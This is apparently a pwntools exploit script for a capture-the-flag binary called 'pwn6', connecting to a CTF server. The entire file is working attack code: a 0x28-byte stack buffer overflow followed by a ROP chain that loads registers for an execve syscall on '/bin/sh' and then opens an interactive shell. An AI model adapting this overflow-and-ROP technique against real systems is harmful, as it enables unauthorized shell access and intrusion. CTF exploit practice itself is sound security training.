from pwn import *
context.log_level='debug'
context.terminal=['gnome-terminal','-x','sh','-c']

p=process('pwn6')
p=remote('ctf.nefu.edu.cn',33109)
elf=ELF('./pwn6')
if args.G:
	gdb.attach(p)
	pause()

pop_r13=0x04005fd
pop_r14=0x0400600
pop_r15=0x0400603
pop_rdi=0x04005fb
binsh=0x0601040
syscall=0x040061f
mmm_syscall=0x0400606
payload=b'a'*0x28+p64(pop_r13)+p64(0x3b)+p64(pop_r14)+p64(0)+p64(pop_r15)+p64(0)+p64(pop_rdi)+p64(binsh)+p64(mmm_syscall)
p.sendline(payload)
p.interactive()
